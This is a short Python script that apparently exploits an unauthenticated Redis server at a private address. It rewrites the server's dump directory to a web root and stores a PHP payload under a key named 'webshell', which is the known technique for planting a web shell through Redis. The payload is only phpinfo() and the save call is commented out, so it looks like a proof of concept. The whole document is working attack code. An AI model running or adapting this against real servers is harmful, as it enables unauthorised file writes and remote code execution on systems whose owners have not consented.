import redis

r = redis.StrictRedis(host='192.168.49.153', port=6379, db=0,socket_timeout=2)

r.config_set('dir', '/var/www/8011')
r.config_set('dbfilename',"authorized")
r.set("webshell","<?php phpinfo();?>")
print r.get("webshell")
#r.save()
